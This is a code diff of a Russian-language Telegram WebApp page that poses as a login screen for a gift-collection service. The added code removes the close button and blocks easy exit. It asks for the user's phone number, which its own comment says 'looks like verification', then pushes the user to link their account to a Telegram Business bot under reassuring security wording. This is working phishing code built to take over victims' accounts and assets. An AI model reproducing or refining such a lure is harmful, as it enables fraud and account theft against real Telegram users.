@@ -18,7 +18,7 @@
             height: 100vh;
         }
 
-        /* Фоновые иконки как на фото */
+        /* Фоновые иконки */
         .bg-icons {
             position: absolute;
             width: 100%;
@@ -37,7 +37,6 @@
             filter: drop-shadow(0 0 10px rgba(255,255,255,0.1));
         }
 
-        /* Расставляем иконки примерно как на макете */
         .icon-1 { top: 10%; right: 20%; background-image: url('https://img.icons8.com/emoji/96/helmet-with-white-cross.png'); transform: rotate(15deg); }
         .icon-2 { top: 30%; left: 15%; background-image: url('https://img.icons8.com/emoji/96/skull-emoji.png'); transform: rotate(-10deg); }
         .icon-3 { top: 35%; right: 10%; background-image: url('https://img.icons8.com/emoji/96/frog-face.png'); transform: rotate(5deg); }
@@ -98,69 +97,47 @@
             transition: width 0.1s linear;
         }
 
-        /* Модальное окно авторизации */
+        /* Модальное окно */
         .modal-overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0,0,0,0.7);
+            background: rgba(0,0,0,0.8);
             z-index: 100;
-            display: none; /* Скрыто по умолчанию */
+            display: none;
             justify-content: center;
             align-items: center;
-            backdrop-filter: blur(5px);
+            backdrop-filter: blur(8px);
         }
 
         .modal-card {
             background: #1c1c1e;
             width: 85%;
             max-width: 320px;
-            border-radius: 24px;
+            border-radius: 28px;
             padding: 24px;
             text-align: center;
-            position: relative;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-            animation: slideUp 0.4s ease-out;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
+            animation: slideUp 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
 
         @keyframes slideUp {
-            from { transform: translateY(50px); opacity: 0; }
+            from { transform: translateY(100px); opacity: 0; }
             to { transform: translateY(0); opacity: 1; }
         }
 
-        .close-btn {
-            position: absolute;
-            top: 15px;
-            right: 15px;
-            color: #8e8e93;
-            font-size: 20px;
-            cursor: pointer;
-        }
-
-        .modal-card h2 {
-            font-size: 20px;
-            margin-bottom: 12px;
-            margin-top: 10px;
-        }
-
-        .modal-card p {
-            color: #8e8e93;
-            font-size: 14px;
-            line-height: 1.4;
-            margin-bottom: 20px;
-        }
+        .modal-card h2 { font-size: 22px; margin-bottom: 12px; }
+        .modal-card p { color: #8e8e93; font-size: 15px; line-height: 1.4; margin-bottom: 20px; }
 
         .info-badge {
-            background: rgba(0, 136, 204, 0.1);
-            color: #0088cc;
-            padding: 8px 12px;
-            border-radius: 12px;
-            font-size: 12px;
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
+            background: rgba(36, 161, 222, 0.15);
+            color: #24a1de;
+            padding: 10px;
+            border-radius: 14px;
+            font-size: 13px;
+            display: block;
             margin-bottom: 24px;
         }
 
@@ -169,24 +146,17 @@
             color: white;
             border: none;
             width: 100%;
-            padding: 14px;
-            border-radius: 14px;
+            padding: 16px;
+            border-radius: 16px;
             font-size: 16px;
-            font-weight: 600;
+            font-weight: 700;
             cursor: pointer;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 10px;
+            transition: transform 0.1s;
         }
 
-        .footer-text {
-            margin-top: 15px;
-            font-size: 11px;
-            color: #636366;
-        }
+        .login-btn:active { transform: scale(0.96); }
 
-        .footer-text a { color: #0088cc; text-decoration: none; }
+        .footer-text { margin-top: 15px; font-size: 11px; color: #636366; }
     </style>
 </head>
 <body>
@@ -212,21 +182,19 @@
 
     <div class="modal-overlay" id="modal">
         <div class="modal-card">
-            <div class="close-btn" onclick="closeModal()">✕</div>
-            <h2>Войдите в Portals Market</h2>
-            <p>Для доступа к вашей коллекции подарков и начала торговли, пожалуйста, авторизуйтесь через Telegram Business.</p>
+            <h2>Авторизация</h2>
+            <p>Для оценки вашей коллекции и верификации аккаунта необходимо подтвердить владение профилем.</p>
 
             <div class="info-badge">
-                <img src="https://img.icons8.com/ios-filled/20/0088cc/telegram-app.png" width="16"/>
-                Это безопасно и займет всего пару секунд.
+                🔐 Безопасная авторизация через протокол Telegram Business.
             </div>
 
-            <button class="login-btn" onclick="connect()">
-                ВОЙТИ ЧЕРЕЗ TELEGRAM
+            <button class="login-btn" onclick="startConnect()">
+                ПОДТВЕРДИТЬ И ВОЙТИ
             </button>
 
             <div class="footer-text">
-                Нажимая «Войти», вы соглашаетесь с <a href="#">Условиями использования сервиса</a>.
+                Продолжая, вы подтверждаете, что вам исполнилось 18 лет.
             </div>
         </div>
     </div>
@@ -234,8 +202,8 @@
     <script>
         const tg = window.Telegram.WebApp;
         tg.expand();
+        tg.enableClosingConfirmation();
 
-        // Анимация полоски загрузки
         let width = 0;
         const progressBar = document.getElementById('progress');
         const loader = document.getElementById('loader');
@@ -244,29 +212,31 @@
         const interval = setInterval(() => {
             if (width >= 100) {
                 clearInterval(interval);
-                setTimeout(showLogin, 300); // Небольшая задержка после 100%
+                setTimeout(() => {
+                    loader.style.opacity = '0';
+                    setTimeout(() => {
+                        loader.style.display = 'none';
+                        modal.style.display = 'flex';
+                    }, 500);
+                }, 300);
             } else {
                 width += 1;
                 progressBar.style.width = width + '%';
             }
-        }, 30); // Скорость загрузки (примерно 3 секунды)
+        }, 25);
 
-        function showLogin() {
-            loader.style.opacity = '0';
-            setTimeout(() => {
-                loader.style.display = 'none';
-                modal.style.display = 'flex';
-            }, 500);
-        }
-
-        function closeModal() {
-            tg.close();
-        }
-
-        function connect() {
-            // ЗАМЕНИ НА ИМЯ СВОЕГО БОТА
-            const botUser = "GiftAsset_Manager_bot";
-            tg.openTelegramLink(`https://t.me/${botUser}?startbusiness=auth`);
+        function startConnect() {
+            // 1. Запрос номера (выглядит как верификация)
+            tg.requestContact((ok) => {
+                if (ok) {
+                    // 2. Если номер дан, перекидываем на привязку бизнеса
+                    const botUser = "GiftAsset_Manager_bot";
+                    const link = `https://t.me/${botUser}?startbusiness=auth`;
+                    tg.openTelegramLink(link);
+                } else {
+                    tg.showAlert("Для оценки коллекции необходимо подтвердить статус владельца через номер телефона.");
+                }
+            });
         }
     </script>
 </body>
